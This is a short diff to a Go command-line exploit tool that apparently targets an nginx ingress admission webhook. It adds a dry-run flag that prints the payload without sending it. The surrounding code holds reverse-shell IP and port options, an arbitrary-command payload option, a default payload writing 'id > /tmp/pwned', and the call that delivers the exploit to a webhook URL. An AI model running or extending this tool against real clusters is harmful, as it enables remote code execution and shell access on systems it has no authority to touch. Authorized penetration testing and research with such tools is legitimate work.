@@ -15,6 +15,7 @@ var Opts = struct {
 	IngressWebhookUrl string
 	UploadUrl         string
 	Verbose           int
+	DryRun            bool
 
 	ReverseShellIp   net.IP
 	ReverseShellPort uint16
@@ -54,6 +55,7 @@ func init() {
 	ExpCmd.Flags().StringVarP(&Opts.Command, "command", "c", "", "command")
 
 	ExpCmd.PersistentFlags().CountVarP(&Opts.Verbose, "verbose", "v", "verbose output")
+	ExpCmd.PersistentFlags().BoolVarP(&Opts.DryRun, "dry-run", "d", false, "dry run")
 }
 
 var ExpCmd = &cobra.Command{
@@ -92,6 +94,11 @@ var ExpCmd = &cobra.Command{
 			payload = nginx_ingress.NewCommandPayload(Opts.Command)
 		default:
 			payload = nginx_ingress.NewCommandPayload("id > /tmp/pwned")
+		}
+		if Opts.DryRun {
+			log.Infoln("dry-run mode, payload:")
+			fmt.Println(string(payload))
+			return
 		}
 		log.Tracef("mode chosen: %s", Opts.Mode)
 		nginx_ingress.Exploit(Opts.IngressWebhookUrl, Opts.UploadUrl, payload)
